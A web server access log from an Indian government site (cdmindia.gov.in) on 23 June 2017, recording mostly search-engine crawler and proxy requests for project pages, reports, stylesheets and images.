40.77.167.35 - - [23/Jun/2017:07:33:12 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.35 - - [23/Jun/2017:07:33:13 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.17 - - [23/Jun/2017:07:33:36 +0530] "GET /reports_list_details.php?id=pnjuzahme&reporttype=&page=239 HTTP/1.1" 200 22247 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.102.6.113 - - [23/Jun/2017:07:34:09 +0530] "GET /project_details_view.php?id=1363 HTTP/1.1" 200 14346 "https://www.google.co.in/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.111 - - [23/Jun/2017:07:34:10 +0530] "GET /images/spacer.gif HTTP/1.1" 200 43 "http://www.cdmindia.gov.in/project_details_view.php?id=1363" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.113 - - [23/Jun/2017:07:34:10 +0530] "GET /images/bullet1.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=1363" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.113 - - [23/Jun/2017:07:34:10 +0530] "GET /images/bulllet2.gif HTTP/1.1" 200 58 "http://www.cdmindia.gov.in/project_details_view.php?id=1363" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.111 - - [23/Jun/2017:07:34:10 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "http://www.cdmindia.gov.in/project_details_view.php?id=1363" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.111 - - [23/Jun/2017:07:34:10 +0530] "GET /images/fdm.jpg HTTP/1.1" 200 2043 "http://www.cdmindia.gov.in/project_details_view.php?id=1363" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.111 - - [23/Jun/2017:07:34:10 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 200 8321 "http://www.cdmindia.gov.in/project_details_view.php?id=1363" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.113 - - [23/Jun/2017:07:34:10 +0530] "GET /project_details_view.php?id=1363 HTTP/1.1" 200 14346 "-" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.115 - - [23/Jun/2017:07:34:10 +0530] "GET /includes/ncdma.css HTTP/1.1" 200 13023 "http://www.cdmindia.gov.in/project_details_view.php?id=1363" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.113 - - [23/Jun/2017:07:34:10 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "http://www.cdmindia.gov.in/project_details_view.php?id=1363" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.115 - - [23/Jun/2017:07:34:10 +0530] "GET /images/img1.jpg HTTP/1.1" 200 1251 "http://www.cdmindia.gov.in/project_details_view.php?id=1363" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.111 - - [23/Jun/2017:07:34:10 +0530] "GET /images/gtz.jpg HTTP/1.1" 200 15484 "http://www.cdmindia.gov.in/project_details_view.php?id=1363" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.111 - - [23/Jun/2017:07:34:10 +0530] "GET /images/img2.jpg HTTP/1.1" 200 16276 "http://www.cdmindia.gov.in/project_details_view.php?id=1363" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.7.253 - - [23/Jun/2017:07:34:10 +0530] "GET /images/bullet4.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=1363" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.115 - - [23/Jun/2017:07:34:10 +0530] "GET /images/img3.jpg HTTP/1.1" 200 26957 "http://www.cdmindia.gov.in/project_details_view.php?id=1363" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.111 - - [23/Jun/2017:07:34:10 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "http://www.cdmindia.gov.in/project_details_view.php?id=1363" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.113 - - [23/Jun/2017:07:34:10 +0530] "GET /images/bullet4.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=1363" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.115 - - [23/Jun/2017:07:34:10 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 200 8321 "http://www.cdmindia.gov.in/project_details_view.php?id=1363" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.111 - - [23/Jun/2017:07:34:10 +0530] "GET /images/fdm.jpg HTTP/1.1" 200 2043 "http://www.cdmindia.gov.in/project_details_view.php?id=1363" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.113 - - [23/Jun/2017:07:34:10 +0530] "GET /images/gtz.jpg HTTP/1.1" 200 15484 "http://www.cdmindia.gov.in/project_details_view.php?id=1363" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.115 - - [23/Jun/2017:07:34:10 +0530] "GET /images/bullet1.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=1363" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.115 - - [23/Jun/2017:07:34:10 +0530] "GET /images/bulllet2.gif HTTP/1.1" 200 58 "http://www.cdmindia.gov.in/project_details_view.php?id=1363" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.115 - - [23/Jun/2017:07:34:10 +0530] "GET /includes/ncdma.css HTTP/1.1" 200 13023 "http://www.cdmindia.gov.in/project_details_view.php?id=1363" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.115 - - [23/Jun/2017:07:34:10 +0530] "GET /images/img2.jpg HTTP/1.1" 200 16276 "http://www.cdmindia.gov.in/project_details_view.php?id=1363" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.7.253 - - [23/Jun/2017:07:34:11 +0530] "GET /images/spacer.gif HTTP/1.1" 200 43 "http://www.cdmindia.gov.in/project_details_view.php?id=1363" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.113 - - [23/Jun/2017:07:34:10 +0530] "GET /images/img3.jpg HTTP/1.1" 200 26957 "http://www.cdmindia.gov.in/project_details_view.php?id=1363" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.115 - - [23/Jun/2017:07:34:11 +0530] "GET /images/img1.jpg HTTP/1.1" 200 1251 "http://www.cdmindia.gov.in/project_details_view.php?id=1363" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.111 - - [23/Jun/2017:07:34:11 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "http://www.cdmindia.gov.in/project_details_view.php?id=1363" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.249.79.17 - - [23/Jun/2017:07:34:45 +0530] "GET /project_details_view_report.php?id=1260 HTTP/1.1" 200 13257 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.15 - - [23/Jun/2017:07:36:27 +0530] "GET /reports_list_details.php?id=pnjuzahme&reporttype=&page=235 HTTP/1.1" 200 21972 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.15 - - [23/Jun/2017:07:36:29 +0530] "GET /reports_list_details.php?id=pnjuzahme&reporttype=&page=288 HTTP/1.1" 200 22126 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.81 - - [23/Jun/2017:07:36:55 +0530] "GET /project_details_view_report.php?id=270 HTTP/1.1" 200 13067 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.19 - - [23/Jun/2017:07:40:44 +0530] "GET /reports_list_details.php?id=pnjuzahme&reporttype=&page=260 HTTP/1.1" 200 22374 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.19 - - [23/Jun/2017:07:41:37 +0530] "GET /reports_list_details.php?id=pnjuzahme&reporttype=&page=265 HTTP/1.1" 200 21986 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
90.0.108.64 - - [23/Jun/2017:07:44:42 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "Java/1.8.0_101"
35.184.189.105 - - [23/Jun/2017:07:44:45 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
66.249.79.19 - - [23/Jun/2017:07:45:40 +0530] "GET /reports_list_details.php?id=pnjuzahme&reporttype=&page=261 HTTP/1.1" 200 22016 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.15 - - [23/Jun/2017:07:46:27 +0530] "GET /project_details_view.php?id=1348&oid=1&page=24&reporttype=1 HTTP/1.1" 200 14712 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
202.46.48.98 - - [23/Jun/2017:07:46:32 +0530] "GET /project_details_view_report.php?id=1588 HTTP/1.1" 200 13144 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
66.249.79.15 - - [23/Jun/2017:07:46:37 +0530] "GET /reports_list_details.php?id=pnjuzahme&reporttype=&page=270 HTTP/1.1" 200 22057 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.102.6.115 - - [23/Jun/2017:07:47:54 +0530] "GET /project_details_view.php?id=930 HTTP/1.1" 200 16544 "-" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.7.252 - - [23/Jun/2017:07:47:54 +0530] "GET /project_details_view.php?id=930 HTTP/1.1" 200 16544 "-" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.111 - - [23/Jun/2017:07:47:55 +0530] "GET /images/bullet4.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.115 - - [23/Jun/2017:07:47:55 +0530] "GET /images/spacer.gif HTTP/1.1" 200 43 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.111 - - [23/Jun/2017:07:47:55 +0530] "GET /images/bulllet2.gif HTTP/1.1" 200 58 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.111 - - [23/Jun/2017:07:47:55 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 200 8321 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.115 - - [23/Jun/2017:07:47:55 +0530] "GET /images/bulllet2.gif HTTP/1.1" 200 58 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.113 - - [23/Jun/2017:07:47:55 +0530] "GET /images/bullet1.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.113 - - [23/Jun/2017:07:47:55 +0530] "GET /includes/ncdma.css HTTP/1.1" 200 13023 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.113 - - [23/Jun/2017:07:47:55 +0530] "GET /images/gtz.jpg HTTP/1.1" 200 15484 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.113 - - [23/Jun/2017:07:47:55 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.111 - - [23/Jun/2017:07:47:55 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.113 - - [23/Jun/2017:07:47:55 +0530] "GET /images/img1.jpg HTTP/1.1" 200 1251 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.111 - - [23/Jun/2017:07:47:55 +0530] "GET /images/img1.jpg HTTP/1.1" 200 1251 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.7.251 - - [23/Jun/2017:07:47:55 +0530] "GET /images/fdm.jpg HTTP/1.1" 200 2043 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.113 - - [23/Jun/2017:07:47:55 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.113 - - [23/Jun/2017:07:47:55 +0530] "GET /images/img2.jpg HTTP/1.1" 200 16276 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
216.244.66.248 - - [23/Jun/2017:07:50:04 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
207.46.13.27 - - [23/Jun/2017:07:50:27 +0530] "GET /project_details_view.php?id=841 HTTP/1.1" 200 14509 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.17 - - [23/Jun/2017:07:51:28 +0530] "GET /project_details_view.php?id=1348&oid=1&page=32&reporttype=1 HTTP/1.1" 200 14712 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.79 - - [23/Jun/2017:07:51:28 +0530] "GET /project_details_view.php?id=1348&oid=1&page=32&reporttype=1 HTTP/1.1" 200 14712 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.167.35 - - [23/Jun/2017:07:51:45 +0530] "GET /detail_news.php?id=20 HTTP/1.1" 302 18266 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.35 - - [23/Jun/2017:07:51:46 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.35 - - [23/Jun/2017:07:51:48 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.17 - - [23/Jun/2017:07:51:58 +0530] "GET /reports_list_details.php?id=pnjuzahme&reporttype=&page=273 HTTP/1.1" 200 21765 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.81 - - [23/Jun/2017:07:55:23 +0530] "GET /project_details_view.php?id=1564 HTTP/1.1" 200 14918 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.15 - - [23/Jun/2017:07:56:28 +0530] "GET /project_details_view.php?id=1418&oid=1&page=20&reporttype=1 HTTP/1.1" 200 15763 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
42.236.10.112 - - [23/Jun/2017:08:00:42 +0530] "GET / HTTP/1.1" 200 19480 "http://www.cdmindia.gov.in/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider"
66.249.79.15 - - [23/Jun/2017:08:01:28 +0530] "GET /project_details_view.php?id=154 HTTP/1.1" 200 14063 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
51.255.65.20 - - [23/Jun/2017:08:06:05 +0530] "GET /imp_links.php HTTP/1.1" 200 17834 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
202.46.52.174 - - [23/Jun/2017:08:06:22 +0530] "GET /project_details_view.php?id=1746 HTTP/1.1" 200 14412 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
66.249.79.17 - - [23/Jun/2017:08:06:37 +0530] "GET /project_details_view.php?id=1334 HTTP/1.1" 200 14414 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
68.187.217.129 - - [23/Jun/2017:08:08:42 +0530] "GET /project_details_view_report.php?id=1371 HTTP/1.1" 200 13155 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
68.187.217.129 - - [23/Jun/2017:08:08:43 +0530] "GET /includes/ncdma.css HTTP/1.1" 200 13023 "http://www.cdmindia.gov.in/project_details_view_report.php?id=1371" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
68.187.217.129 - - [23/Jun/2017:08:08:43 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "http://www.cdmindia.gov.in/project_details_view_report.php?id=1371" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
68.187.217.129 - - [23/Jun/2017:08:08:43 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 200 8321 "http://www.cdmindia.gov.in/project_details_view_report.php?id=1371" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
68.187.217.129 - - [23/Jun/2017:08:08:44 +0530] "GET /images/img1.jpg HTTP/1.1" 200 1251 "http://www.cdmindia.gov.in/project_details_view_report.php?id=1371" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
68.187.217.129 - - [23/Jun/2017:08:08:44 +0530] "GET /images/img2.jpg HTTP/1.1" 200 16276 "http://www.cdmindia.gov.in/project_details_view_report.php?id=1371" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
68.187.217.129 - - [23/Jun/2017:08:08:44 +0530] "GET /images/bullet1.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view_report.php?id=1371" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
68.187.217.129 - - [23/Jun/2017:08:08:44 +0530] "GET /images/spacer.gif HTTP/1.1" 200 43 "http://www.cdmindia.gov.in/project_details_view_report.php?id=1371" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
68.187.217.129 - - [23/Jun/2017:08:08:44 +0530] "GET /images/bulllet2.gif HTTP/1.1" 200 58 "http://www.cdmindia.gov.in/project_details_view_report.php?id=1371" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
68.187.217.129 - - [23/Jun/2017:08:08:44 +0530] "GET /images/img3.jpg HTTP/1.1" 200 26957 "http://www.cdmindia.gov.in/project_details_view_report.php?id=1371" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
68.187.217.129 - - [23/Jun/2017:08:08:44 +0530] "GET /images/bullet4.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view_report.php?id=1371" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
68.187.217.129 - - [23/Jun/2017:08:08:44 +0530] "GET /images/fdm.jpg HTTP/1.1" 200 2043 "http://www.cdmindia.gov.in/project_details_view_report.php?id=1371" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
68.187.217.129 - - [23/Jun/2017:08:08:45 +0530] "GET /images/gtz.jpg HTTP/1.1" 200 15484 "http://www.cdmindia.gov.in/project_details_view_report.php?id=1371" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
68.187.217.129 - - [23/Jun/2017:08:08:45 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "http://www.cdmindia.gov.in/project_details_view_report.php?id=1371" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
68.187.217.129 - - [23/Jun/2017:08:08:45 +0530] "GET /favicon.ico HTTP/1.1" 200 1189 "http://www.cdmindia.gov.in/project_details_view_report.php?id=1371" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
66.249.79.19 - - [23/Jun/2017:08:11:48 +0530] "GET /project_details_view.php?id=1347 HTTP/1.1" 200 15311 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
207.46.13.27 - - [23/Jun/2017:08:13:10 +0530] "GET /project_details_view.php?id=2056 HTTP/1.1" 200 13904 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.69.83 - - [23/Jun/2017:08:13:10 +0530] "GET /project_details_view_report.php?id=1818 HTTP/1.1" 200 13177 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
